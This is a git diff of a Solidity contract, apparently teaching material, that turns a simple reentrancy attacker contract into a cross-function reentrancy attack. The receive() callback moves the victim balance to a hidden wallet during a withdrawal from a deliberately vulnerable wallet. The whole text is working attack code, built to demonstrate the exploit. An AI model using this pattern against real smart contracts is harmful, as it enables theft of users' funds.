@@ -3,13 +3,15 @@ pragma solidity >=0.6.0 <0.8.0;
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "./VulReentrantWallet.sol";
 
-contract MaliciousReentrantContract is Ownable {
+contract MaliciousCrossReentrantContract is Ownable {
     using SafeMath for uint256;
 
     VulReentrantWallet private _vulWallet;
+    address private _hiddenWallet;
 
-    constructor(address vulWallet) public {
+    constructor(address vulWallet, address hiddenWallet) public {
         _vulWallet = VulReentrantWallet(vulWallet);
+        _hiddenWallet = hiddenWallet;
     }
 
     // Attacker sends ether to the malicious smart contract
@@ -27,7 +29,8 @@ contract MaliciousReentrantContract is Ownable {
 
     // receive function will be called by the vulnerable wallet contract
     receive() external payable {
-        _vulWallet.withdraw();
+        uint256 balanceInVulWallet = _vulWallet.balanceOf(address(this));
+        _vulWallet.transfer(_hiddenWallet, balanceInVulWallet);
     }
 
     // Attacker can withdraw the ethers stored in the malicious smart contract
